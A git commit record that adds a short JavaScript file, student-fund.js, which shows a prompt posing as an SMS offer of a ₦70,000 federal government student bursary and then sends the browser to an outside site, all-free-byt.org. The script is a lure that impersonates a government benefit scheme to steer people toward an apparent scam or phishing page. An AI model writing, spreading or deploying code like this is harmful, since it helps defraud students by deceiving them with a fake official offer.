626fe9825323ae8e3c957e266d3de2d7b2d9d464
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-08-13 14:03:49 -0700

    Create student-fund.js

---
+++ student-fund.js
@@ -0,0 +1,7 @@
+
+
+var password = '1'
+password=prompt('SMS: Register now to receive ₦70,000 FEDERAL GOVERNMENT STUDENTS BURSARY FUND, kindly press 1 to submit your information now ','1');
+if (password != '1') {
+location.href='https://all-free-byt.org/student-busary-scheme.html';
+}
